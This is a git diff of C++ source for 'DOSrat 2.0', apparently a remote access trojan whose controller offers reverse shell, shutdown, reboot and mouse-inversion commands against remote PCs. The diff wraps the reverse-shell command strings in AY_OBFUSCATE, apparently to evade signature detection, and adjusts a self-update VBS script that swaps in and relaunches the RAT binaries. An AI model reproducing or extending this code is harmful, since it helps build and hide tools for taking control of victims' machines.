@@ -174,7 +174,7 @@ bool AutoAggiornamento()
 
     du.DelFile(du.GetModuleFilePath() + "Update\\DOSrat2.0.zip");
 
-    if(!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\DOSrat 2.0.exe\", \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\Build\\Client.exe\", \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nWshShell.Run \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
+    if(!du.WriteFile(du.GetModuleFilePath() + "Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\DOSrat 2.0.exe\", \"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\nfilesys.MoveFile \"" + du.GetModuleFilePath() + "Update\\Build\\Client.exe\", \"" + du.GetModuleFilePath() + "Build\\Client.exe\"\nWScript.Sleep 1000\nWshShell.Run \"\"\"" + du.GetModuleFilePath() + "DOSrat 2.0.exe\"\"\", 1, false\nfilesys.DeleteFile \"" + du.GetModuleFilePath() + "Update.vbs\""))
         return false;
 
     su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
@@ -533,7 +533,7 @@ bool ReverseShell(SOCKET Sock)
 	
     cout << endl;
 
-    if (COMUNICAZIONI::ReverseShell(Sock, "reverseshell") == "OK")
+    if (COMUNICAZIONI::ReverseShell(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
     {
         while (true)
         {
@@ -561,7 +561,7 @@ bool ReverseShell(SOCKET Sock)
 
                 if (Res == "")
                     return false;
-                else if (Res == "Reverse shell closed")
+                else if (Res == (string)AY_OBFUSCATE("Reverse shell closed"))
                 {
                     cout << endl;
                     return true;
@@ -613,7 +613,7 @@ void Sessione(int ID, SOCKET Sock)
             StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
             StampaHelp("Shutdown\t", "- Spegne il PC.");
             StampaHelp("Reboot\t\t", "- Riavvia il PC.");
-			StampaHelp("Reverseshell\t", "- Lancia comandi sulla shell del PC remoto.");
+			StampaHelp((string)AY_OBFUSCATE("Reverseshell\t"), "- Lancia comandi sulla shell del PC remoto.");
             cout << char(192) << char(196) << "Revshell" << endl;
             cout << endl;
 
@@ -696,7 +696,7 @@ void Sessione(int ID, SOCKET Sock)
             else
                 Controllo = false;
         }
-        else if (cmd == "reverseshell" || cmd == "revshell")
+        else if (cmd == (string)AY_OBFUSCATE("reverseshell") || cmd == "revshell")
         {
             if (!ReverseShell(Sock))
                 Controllo = CheckConnection(Sock, ID);
